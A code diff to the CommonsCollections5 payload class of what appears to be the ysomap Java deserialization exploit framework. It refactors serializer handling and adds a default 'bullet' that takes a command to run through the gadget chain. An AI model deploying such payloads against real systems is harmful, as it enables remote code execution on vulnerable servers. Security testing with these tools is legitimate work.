@@ -4,12 +4,14 @@ import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.keyvalue.TiedMapEntry;
 import org.apache.commons.collections.map.LazyMap;
-import ysomap.PayloadTester;
+import ysomap.runner.PayloadTester;
 import ysomap.annotation.Authors;
 import ysomap.annotation.Dependencies;
 import ysomap.gadget.ObjectGadget;
 import ysomap.gadget.bullet.collections.TransformerWithTemplatesImplBullet;
 import ysomap.gadget.payload.Payload;
+import ysomap.serializer.Serializer;
+import ysomap.serializer.SerializerFactory;
 import ysomap.util.Reflections;
 
 import java.lang.reflect.Field;
@@ -30,6 +32,11 @@ public class CommonsCollections5 extends Payload<HashSet> {
     @Override
     public boolean checkObject(Object obj) {
         return obj instanceof Transformer[];
+    }
+
+    @Override
+    public Serializer<?> getSerializer() {
+        return SerializerFactory.createSerializer("");
     }
 
     @Override
@@ -83,8 +90,13 @@ public class CommonsCollections5 extends Payload<HashSet> {
         return map;
     }
 
+    @Override
+    public ObjectGadget getDefaultBullet(String command) {
+        return new TransformerWithTemplatesImplBullet(command, "3");
+    }
+
     public static void main(String[] args) {
-        ObjectGadget bullet = new TransformerWithTemplatesImplBullet(null, 3);
+        ObjectGadget bullet = new TransformerWithTemplatesImplBullet(null, "3");
         new PayloadTester(CommonsCollections5.class)
                 .setBullet(bullet)
                 .run();
